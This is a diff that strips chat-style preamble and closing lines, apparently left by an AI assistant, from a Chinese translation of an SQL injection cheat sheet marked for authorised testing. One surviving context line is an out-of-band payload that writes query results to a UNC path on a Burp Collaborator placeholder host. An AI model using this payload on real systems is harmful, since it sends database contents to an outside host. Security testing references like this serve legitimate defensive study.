@@ -1,4 +1,4 @@
-下面是一份可直接放到 GitHub 的中文翻译版，SQL 关键字、函数名、占位符和代码保持原样。建议保存为 `SQL-Injection-Cheat-Sheet-zh.md`。
+
 
 > 说明：本文为原速查表的中文翻译，仅用于授权安全测试、防御学习和漏洞复现环境。
 
@@ -248,4 +248,4 @@ SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
 
 ---
 
-如果你希望更适合 GitHub 展示，我还可以继续帮你整理成带目录、徽章和“仅限授权测试”免责声明的版本。
+
